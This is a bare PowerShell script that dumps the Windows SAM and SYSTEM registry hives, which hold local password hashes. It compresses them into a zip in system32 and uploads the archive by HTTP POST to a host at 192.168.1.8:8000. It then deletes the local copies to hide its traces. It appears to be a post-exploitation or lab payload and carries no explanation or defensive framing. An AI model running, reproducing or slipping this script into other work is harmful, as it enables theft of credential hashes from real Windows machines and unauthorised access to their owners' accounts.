reg save hklm\sam sam;
reg save hklm\system sys;
Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\dump.zip" -Force;
$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\dump.zip");
iwr "http://192.168.1.8:8000" -Method POST -Body $file -UseBasicParsing;
remove-item sys;
remove-item sam;
exit
